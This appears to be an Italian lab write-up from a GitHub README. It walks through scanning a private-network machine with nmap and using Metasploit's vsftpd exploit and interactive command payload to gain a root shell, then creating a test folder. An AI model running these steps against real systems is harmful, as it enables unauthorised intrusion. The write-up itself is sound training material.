# **Metasploit**
Nell'esercizio di oggi abbiamo utilizzato il framework di metasploit per bucare una vulnerabiltà nota sulla porta 21.

## **Processo**
### **nmap**
Scansione IP della macchina target
```bash
nmap -sV -T5 192.168.1.1
```
➡️ [Risultato scansione](https://github.com/OctavianIT/Octavian_Ceresau_Metasploit/blob/main/Octavian_Ceresau_Metasploit/foto/2.png)
### **vsftpd**
Ho cercato una parola chiave che mi potesse trovare la vulnerabilità nota
```bash
search vsftpd 
```
➡️ [Risultato scansione](https://github.com/OctavianIT/Octavian_Ceresau_Metasploit/blob/main/Octavian_Ceresau_Metasploit/foto/3.png)
### **payload**
Tramite il comando show ho trovato i payload utilizzabili con questo exploit
```bash
show payloads
```
➡️ [Payloads](https://github.com/OctavianIT/Octavian_Ceresau_Metasploit/blob/main/Octavian_Ceresau_Metasploit/foto/3.png)
### **host**
Ho settato l'host target da bucare
```bash
set RHOSTS 192.168.1.149
```
### **payload**
Ho impostato il payload per l'exploit
```bash
set payload /payload/cmd/unix/interact
```

### **avvio**
Dopo aver settato tutto ho avviato il framework
```bash
exploit
```
➡️ [Avvio](https://github.com/OctavianIT/Octavian_Ceresau_Metasploit/blob/main/Octavian_Ceresau_Metasploit/foto/7.png)

### **ls**
Digito un semplice comando per visuallizare tutte le directory
```bash
ls
```
➡️[Risultato](https://github.com/OctavianIT/Octavian_Ceresau_Metasploit/blob/main/Octavian_Ceresau_Metasploit/foto/8.png)

### **cd**
Sono entrato nella directory root
```bash
cd root
```
### **root**
Creao una cartella nella directory root e poi visualizzo il contenuto
```bash
mkdir test_metasploit
ls
```
➡️[Risultato](https://github.com/OctavianIT/Octavian_Ceresau_Metasploit/blob/main/Octavian_Ceresau_Metasploit/foto/10.png)

